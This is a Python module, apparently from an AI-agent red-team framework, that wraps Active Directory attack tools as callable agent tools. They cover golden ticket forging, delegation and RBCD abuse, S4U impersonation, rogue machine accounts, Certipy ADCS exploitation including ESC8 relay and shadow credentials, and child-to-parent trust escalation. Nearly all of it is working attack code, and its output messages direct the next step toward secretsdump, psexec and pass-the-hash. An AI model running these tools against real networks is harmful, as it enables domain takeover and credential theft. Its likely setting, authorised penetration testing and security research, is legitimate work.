"""Red Team Kerberos and certificate-based attack tools.

This module provides toolsets for:
- Golden ticket generation
- Delegation attacks (constrained/unconstrained/RBCD)
- AD CS exploitation (Certipy)
- Trust relationship attacks
"""

import logging
import re
import shlex
import uuid
from datetime import datetime, timezone
from typing import ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Hash, SharedRedTeamState, TimelineEvent, VulnerabilityInfo
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    format_weakness_block,
    resolve_password,
    run_tool,
)

logger = logging.getLogger(__name__)


class GoldenTicketTools(Toolset):
    """Tools for Kerberos golden ticket generation and domain escalation."""

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Get the SID (Security Identifier) of a domain.

        This is required for golden ticket generation. You need to get SIDs for BOTH:
        1. The compromised domain (where you have the krbtgt hash)
        2. The target domain (where you want to escalate)

        Args:
            domain: Target domain (e.g., 'subdomain.example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)

        Returns:
            Domain SID and list of domain users (look for "[*] Domain SID is: ...")

        Example:
            >>> get_sid("child.example.local", "user", "pass", "192.168.58.100")
            >>> get_sid("parent.example.local", "user", "pass", "192.168.58.101")
        """
        if dc_ip:
            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
            logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
        else:
            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
            logger.info(f"[*] Getting SID for {domain} using {username}")

        try:
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            logger.info(f"[*] SID lookup completed for {domain}")
            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"

    @dn.tool_method
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a Kerberos golden ticket for Administrator to enable domain escalation.

        **This is the ULTIMATE privilege escalation technique.** A golden ticket gives
        you persistent, enterprise-level access to the entire domain forest.

        CRITICAL: The extra_sid should be the target domain SID with "-519" appended
        (Enterprise Admins group). This enables cross-domain privilege escalation.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account (from secretsdump)
            domain_sid: SID of the compromised domain (from get_sid)
            domain: Domain to generate ticket for (same as domain_sid domain)
            extra_sid: Target domain SID with "-519" appended (Enterprise Admins)

        Returns:
            Golden ticket generation output (saves to Administrator.ccache)

        Example:
            >>> generate_golden_ticket(
            ...     "abc123...",  # krbtgt hash
            ...     "S-1-5-21-123-456-789",  # compromised domain SID
            ...     "child.example.local",  # compromised domain
            ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
            ... )
        """
        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.info("[*] Generating golden ticket for Administrator")
            logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            if self.state:
                self.state.has_golden_ticket = True
                if hasattr(self.state, "timeline"):
                    event = TimelineEvent(
                        id=f"evt-{len(self.state.timeline):04d}",
                        timestamp=datetime.now(timezone.utc),
                        description=f"Golden ticket generated for {domain}",
                        mitre_techniques=["T1558.001"],
                        confidence=1.0,
                        source="golden_ticket_generation",
                    )
                    self.state.timeline.append(event)

            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"


class DelegationTools(Toolset):
    """Tools for discovering and exploiting Kerberos delegation vulnerabilities."""

    state: AnyRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    @dn.tool_method
    def find_delegation(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Find all accounts with Kerberos delegation configured.

        Delegation is often exploitable for privilege escalation:
        - Unconstrained: Can impersonate ANY user to ANY service
        - Constrained: Can impersonate ANY user to specific services
        - RBCD: Resource-Based Constrained Delegation for SYSTEM access

        CRITICAL: Run this early - delegation misconfigs are common high-value targets.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            List of accounts with delegation and delegation type

        Example:
            >>> find_delegation("example.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Searching for delegation in {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "unconstrained" in result.lower():
                logger.warning("[!] Unconstrained delegation found!")
                result = (
                    "🚨 UNCONSTRAINED DELEGATION DETECTED!\n"
                    "\u2192 Compromise this account to impersonate ANY user\n"
                    "\u2192 Use Rubeus/mimikatz to harvest TGTs\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Unconstrained Delegation",
                    "Unconstrained delegation configured on account",
                    {},
                    "Allows impersonation of any user",
                    "Delegation enumeration",
                )
                self._add_weakness(block)
            elif "constrained" in result.lower():
                logger.info("[+] Constrained delegation found")
                result = (
                    "🔗 CONSTRAINED DELEGATION DETECTED:\n"
                    "\u2192 Can impersonate users to specific services\n"
                    "\u2192 Check for S4U2Self abuse opportunities\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Constrained Delegation",
                    "Constrained delegation configured on account",
                    {},
                    "Allows impersonation to specific services",
                    "Delegation enumeration",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Delegation search failed: {e}"

    @dn.tool_method
    def rbcd_write(
        self,
        target_computer: str,
        attacker_sid: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Write Resource-Based Constrained Delegation (RBCD) to gain SYSTEM access.

        RBCD abuse allows gaining SYSTEM access when you have GenericWrite on a computer.
        After running this, use S4U2Self/S4U2Proxy to get a service ticket as Administrator.

        Attack chain:
        1. Create/control a machine account (add_computer)
        2. Write RBCD from controlled account to target (this tool)
        3. Use S4U to get Admin ticket
        4. Psexec with ticket

        Args:
            target_computer: Computer to write RBCD on (what you want SYSTEM on)
            attacker_sid: SID of the attacker-controlled account
            domain: Target domain
            username: Username with GenericWrite on target_computer
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            RBCD write result

        Example:
            >>> rbcd_write("TARGETPC$", "S-1-5-21-...-1234", "domain.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "rbcd.py",
            "-delegate-to",
            target_computer,
            "-delegate-from",
            attacker_sid,
            "-action",
            "write",
            "-dc-ip",
            dc_ip,
            f"{domain}/{username}:{resolved_password}",
        ]

        try:
            logger.info(f"[*] Writing RBCD on {target_computer}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "attribute already" in result.lower():
                logger.info("[+] RBCD delegation written successfully!")
                result = (
                    "\u2705 RBCD DELEGATION WRITTEN!\n"
                    "\u2192 Now use S4U2Self to request ticket as Administrator\n"
                    "\u2192 Then use ticket with psexec for SYSTEM access\n\n" + result
                )

            return result

        except Exception as e:
            return f"RBCD write failed: {e}"

    @dn.tool_method
    def s4u_attack(
        self,
        target_spn: str,
        impersonate: str,
        domain: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        dc_ip: str | None = None,
    ) -> str:
        """
        Perform S4U2Self/S4U2Proxy attack to impersonate users via delegation.

        After setting up RBCD or finding constrained delegation, use this to get
        a service ticket as any user (typically Administrator) to the target service.

        Args:
            target_spn: Target SPN to get ticket for (e.g., 'cifs/TARGETPC.domain.local')
            impersonate: User to impersonate (typically 'Administrator')
            domain: Target domain
            username: Username of account with delegation rights
            password: Password (optional if using hash)
            hash: NTLM hash (optional if using password)
            dc_ip: Domain controller IP (optional)

        Returns:
            S4U attack result (includes .ccache ticket path if successful)

        Example:
            >>> s4u_attack("cifs/TARGETPC.domain.local", "Administrator", "domain.local", "svc_account", password="pass")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if resolved_password:
            target_string = f"{domain}/{username}:{resolved_password}"
        elif hash:
            target_string = f"{domain}/{username}"
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd = [
            "impacket-getST",
            "-spn",
            target_spn,
            "-impersonate",
            impersonate,
            target_string,
        ]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        try:
            logger.info(f"[*] Performing S4U attack to impersonate {impersonate}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".ccache" in result:
                logger.info("[+] S4U attack successful - ticket obtained!")
                result = (
                    "🎫 S4U ATTACK SUCCESSFUL!\n"
                    "\u2192 Service ticket obtained for impersonated user\n"
                    "\u2192 Set KRB5CCNAME=<ticket.ccache> and use with psexec\n\n" + result
                )

            return result

        except Exception as e:
            return f"S4U attack failed: {e}"

    @dn.tool_method
    def add_computer(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        computer_name: str = "",
        computer_password: str = "",
    ) -> str:
        """
        Add a machine account to the domain (default MachineAccountQuota = 10).

        Machine accounts can be used for RBCD attacks or Kerberos delegation abuse.
        Most domains allow any authenticated user to add up to 10 machine accounts.

        Args:
            domain: Target domain
            username: Any valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            computer_name: Name for the new computer (auto-generated if empty)
            computer_password: Password for the computer (auto-generated if empty)

        Returns:
            Computer creation result with credentials

        Example:
            >>> add_computer("domain.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if not computer_name:
            computer_name = f"EVIL{uuid.uuid4().hex[:6].upper()}$"
        if not computer_password:
            computer_password = f"Password{uuid.uuid4().hex[:8]}!"

        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{resolved_password}",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_password,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Adding machine account {computer_name} to {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "already exists" in result.lower():
                logger.info(f"[+] Machine account {computer_name} added!")
                result = (
                    f"\u2705 MACHINE ACCOUNT CREATED!\n"
                    f"\u2192 Computer: {computer_name}\n"
                    f"\u2192 Password: {computer_password}\n"
                    "\u2192 Use this for RBCD attacks\n\n" + result
                )

            return result

        except Exception as e:
            return f"Add computer failed: {e}"


class CertipyTools(Toolset):
    """Tools for AD Certificate Services (ADCS) enumeration and exploitation.

    These tools target common ADCS misconfigurations (ESC1-15) that can lead to
    domain admin privileges.
    """

    state: AnyRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _queue_esc8_vulnerability(
        self,
        certipy_output: str,
        domain: str,
        dc_ip: str,
        username: str,
        password: str | None,
    ) -> None:
        """
        Queue ESC8 vulnerability for exploitation when detected.

        ESC8 requires a two-step attack:
        1. Start certipy_relay_esc8 to listen for relayed auth
        2. Use coercion (petitpotam/coercer) to force DC authentication

        This method adds the vulnerability to state so the orchestrator
        can dispatch the necessary coercion tasks.
        """
        if not self.state:
            logger.warning("Cannot queue ESC8 vulnerability: no state available")
            return

        # Extract CA information from certipy output
        ca_name = None
        ca_host = None

        # Look for CA name in output (e.g., "CA Name: corp-DC01-CA")
        ca_match = re.search(r"CA Name\s*:\s*([^\n\r]+)", certipy_output, re.IGNORECASE)
        if ca_match:
            ca_name = ca_match.group(1).strip()

        # Look for CA host/DNS (e.g., "DNS Name: dc01.corp.local")
        dns_match = re.search(
            r"(?:DNS Name|Web Services|Web Enrollment)\s*:\s*([^\n\r]+)",
            certipy_output,
            re.IGNORECASE,
        )
        if dns_match:
            ca_host = dns_match.group(1).strip()

        # Create unique vulnerability ID
        vuln_id = f"ADCS_ESC8_{domain}_{uuid.uuid4().hex[:8]}"

        # Build details for exploitation
        details: dict[str, str | list[str] | None] = {
            "ca_name": ca_name,
            "ca_host": ca_host or dc_ip,
            "domain": domain,
            "dc_ip": dc_ip,
            "username": username,
            "password": password,
            "attack_steps": [
                "1. Start certipy_relay_esc8 to listen on attacker interface",
                "2. Use petitpotam or coercer to coerce DC authentication to attacker",
                "3. Relay will capture DC machine certificate",
                "4. Use certipy_auth with captured certificate to get DC machine hash",
                "5. Use hash for DCSync or pass-the-hash",
            ],
            "note": "ESC8 requires COERCION agent to force authentication. "
            "Dispatch coercion task after starting relay.",
        }

        # Create and add vulnerability to state
        vuln = VulnerabilityInfo(
            vuln_id=vuln_id,
            vuln_type="ADCS_ESC8",
            target=ca_host or dc_ip,
            discovered_by="certipy_find",
            details=details,
            priority=3,  # High priority - ADCS_ESC8 is priority 3 in dispatcher
            recommended_agent="privesc",
        )

        if not isinstance(self.state, SharedRedTeamState):
            logger.debug("State does not support add_vulnerability (not SharedRedTeamState)")
            return

        added = self.state.add_vulnerability(vuln)
        if added:
            logger.warning(
                f"[!] ESC8 vulnerability queued for exploitation: {vuln_id} "
                f"(CA: {ca_name or 'unknown'}, host: {ca_host or dc_ip})"
            )
        else:
            logger.debug(f"ESC8 vulnerability already queued for {domain}")

    @dn.tool_method
    def certipy_find(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        vulnerable: bool = True,
    ) -> str:
        """
        Enumerate ADCS (Active Directory Certificate Services) for vulnerabilities.

        CRITICAL: ADCS vulnerabilities (ESC1-15) are among the most reliable paths
        to Domain Admin. Run this early if the domain has a CA.

        Common findings:
        - ESC1: Template allows client auth + requester specifies SAN
        - ESC4: Template misconfigured to allow low-priv enrollment
        - ESC8: Web enrollment (HTTP) endpoint allows NTLM relay

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            vulnerable: Only show vulnerable templates (default: True)

        Returns:
            ADCS enumeration results highlighting exploitable templates

        Example:
            >>> certipy_find("example.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        realm = domain.upper()
        krb5_conf = f"/tmp/ares-krb5-{uuid.uuid4().hex}.conf"  # nosec B108  # noqa: S108
        cmd_list = [
            "certipy",
            "find",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-stdout",
        ]
        if vulnerable:
            cmd_list.append("-vulnerable")
        cmd_str = " ".join(shlex.quote(arg) for arg in cmd_list)
        cmd_script = (
            f"tmp_conf={krb5_conf}\n"
            "trap 'rm -f \"$tmp_conf\"' EXIT\n"
            "cat > \"$tmp_conf\" <<'EOF'\n"
            "[libdefaults]\n"
            f" default_realm = {realm}\n"
            " dns_lookup_kdc = false\n"
            " dns_lookup_realm = false\n"
            "[realms]\n"
            f" {realm} = {{\n"
            f"  kdc = {dc_ip}\n"
            " }\n"
            "[domain_realm]\n"
            f" .{domain} = {realm}\n"
            f" {domain} = {realm}\n"
            "EOF\n"
            f'env KRB5_CONFIG="$tmp_conf" {cmd_str}\n'
        )
        cmd: list[str] = ["bash", "-lc", cmd_script]

        try:
            logger.info(f"[*] Enumerating ADCS in {domain}")
            # Run locally on privesc agent (certipy is installed there, not on recon)
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            vuln_match = re.search(r"(ESC\d+)", result, re.IGNORECASE)
            if vuln_match:
                esc_type = vuln_match.group(1).upper()
                logger.warning(f"[!] ADCS vulnerability found: {esc_type}")
                result = (
                    f"🚨 ADCS VULNERABILITY DETECTED: {esc_type}!\n"
                    "\u2192 Use certipy_request to exploit vulnerable template\n"
                    "\u2192 Request certificate as Administrator\n\n" + result
                )
                block = format_weakness_block(
                    f"ADCS Vulnerability - {esc_type}",
                    f"Certificate template vulnerable to {esc_type}",
                    {},
                    "Allows impersonation of privileged accounts",
                    "Certipy ADCS enumeration",
                )
                self._add_weakness(block)

            if "esc8" in result.lower() or "web enrollment" in result.lower():
                logger.warning("[!] ESC8 detected - HTTP Web Enrollment vulnerable to relay!")
                if "🚨" not in result:
                    result = (
                        "🚨 ESC8 DETECTED - WEB ENROLLMENT RELAY POSSIBLE!\n"
                        "\u2192 Use certipy_relay_esc8 to set up relay listener\n"
                        "\u2192 Use petitpotam or coercer to coerce DC authentication\n"
                        "\u2192 Then use certipy_auth with the captured certificate\n\n" + result
                    )

                # Auto-queue ESC8 vulnerability for exploitation
                # This ensures the orchestrator knows to dispatch coercion tasks
                self._queue_esc8_vulnerability(result, domain, dc_ip, username, resolved_password)

            return result

        except Exception as e:
            return f"Certipy find failed: {e}"

    @dn.tool_method
    def certipy_request(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        ca: str,
        template: str,
        upn: str = "Administrator",
    ) -> str:
        """
        Request a certificate using an exploitable template (ESC1/ESC4).

        After finding a vulnerable template with certipy_find, use this to request
        a certificate as any user (typically Administrator). Then use certipy_auth
        to convert the certificate to an NTLM hash.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            ca: Certificate Authority name (from certipy_find output)
            template: Vulnerable template name (from certipy_find output)
            upn: Target user principal name (default: Administrator)

        Returns:
            Certificate request result (saves .pfx file if successful)

        Example:
            >>> certipy_request("example.local", "user", "pass", "192.168.58.10",
            ...                  "example-CA", "VulnTemplate", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "req",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-ca",
            ca,
            "-template",
            template,
            "-upn",
            f"{upn}@{domain}",
        ]

        try:
            logger.info(f"[*] Requesting certificate as {upn} using template {template}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result:
                logger.warning(f"[!] Certificate obtained for {upn}!")
                result = (
                    f"🎫 CERTIFICATE OBTAINED FOR {upn}!\n"
                    "\u2192 Use certipy_auth with the .pfx file to get NTLM hash\n"
                    "\u2192 Then use hash for pass-the-hash or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy request failed: {e}"

    @dn.tool_method
    def certipy_auth(
        self,
        domain: str,
        dc_ip: str,
        pfx_path: str,
    ) -> str:
        """
        Authenticate with a certificate to obtain NTLM hash (PKINIT).

        After obtaining a certificate with certipy_request, use this to convert
        it to an NTLM hash via PKINIT authentication. The hash can then be used
        for pass-the-hash or secretsdump.

        Args:
            domain: Target domain
            dc_ip: Domain controller IP
            pfx_path: Path to the .pfx certificate file

        Returns:
            Authentication result including NTLM hash if successful

        Example:
            >>> certipy_auth("example.local", "192.168.58.10", "administrator.pfx")
        """
        cmd = [
            "certipy",
            "auth",
            "-pfx",
            pfx_path,
            "-dc-ip",
            dc_ip,
            "-domain",
            domain,
        ]

        try:
            logger.info(f"[*] Authenticating with certificate {pfx_path}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "hash" in result.lower() or re.search(r"[a-fA-F0-9]{32}", result):
                logger.warning("[!] NTLM hash obtained from certificate!")
                result = (
                    "🚨 NTLM HASH OBTAINED!\n"
                    "\u2192 Use hash with secretsdump for full domain dump\n"
                    "\u2192 Or use with pass-the-hash for lateral movement\n\n" + result
                )

                if self.state:
                    hash_match = re.search(r"([a-fA-F0-9]{32}:[a-fA-F0-9]{32})", result)
                    if hash_match:
                        hash_obj = Hash(
                            username="Administrator",
                            hash_value=hash_match.group(1),
                            hash_type="NTLM",
                            domain=domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "certipy_auth")
                        else:
                            self.state.hashes.append(hash_obj)

            return result

        except Exception as e:
            return f"Certipy auth failed: {e}"

    @dn.tool_method
    def certipy_shadow(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target: str,
    ) -> str:
        """
        Abuse Key Credentials (shadow credentials) for PKINIT-based auth.

        Similar to pywhisker but integrated with certipy. Adds a certificate-based
        credential to a target user/computer's msDS-KeyCredentialLink attribute.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            target: Target account to add shadow credentials to

        Returns:
            Shadow credentials result (includes certificate if successful)

        Example:
            >>> certipy_shadow("example.local", "user", "pass", "192.168.58.10", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "shadow",
            "auto",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-target",
            target,
        ]

        try:
            logger.info(f"[*] Adding shadow credentials to {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result or "hash" in result.lower():
                logger.warning(f"[!] Shadow credentials attack successful on {target}!")
                result = (
                    f"🚨 SHADOW CREDENTIALS ADDED TO {target}!\n"
                    "\u2192 Certificate/hash obtained for the target\n"
                    "\u2192 Use for authentication or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy shadow failed: {e}"


class TrustAttackTools(Toolset):
    """Tools for Active Directory trust relationship attacks.

    These tools enable escalation from child to parent domains
    and cross-forest attacks.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def raise_child(
        self,
        child_domain: str,
        username: str,
        password: str,
        target_domain: str | None = None,
    ) -> str:
        """
        Escalate from child domain to parent domain (raiseChild.py).

        Automates the child-to-parent domain escalation using the krbtgt hash
        from the child domain to forge a golden ticket with Enterprise Admin SID.

        Use after obtaining krbtgt hash from a child domain via secretsdump.

        Args:
            child_domain: Child domain where you have krbtgt (e.g., "child.domain.local")
            username: Username with access in child domain
            password: Password for authentication
            target_domain: Parent domain to escalate to (auto-detected if omitted)

        Returns:
            Escalation result with tickets and hashes

        Example:
            >>> raise_child("child.domain.local", "administrator", "pass")
        """
        cmd = [
            "raiseChild.py",
            f"{child_domain}/{username}:{password}",
        ]

        if target_domain:
            cmd.extend(["-target-domain", target_domain])

        try:
            logger.info(f"[*] Escalating from {child_domain} to parent domain")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            if "enterprise admin" in result.lower() or "golden ticket" in result.lower():
                logger.info("[+] Child-to-parent escalation successful!")
                result = (
                    "🚨 DOMAIN ESCALATION SUCCESSFUL!\n"
                    "\u2192 Enterprise Admin access obtained\n"
                    "\u2192 Use secretsdump on parent domain DCs\n\n" + result
                )

            return result

        except Exception as e:
            return f"raiseChild failed: {e}"
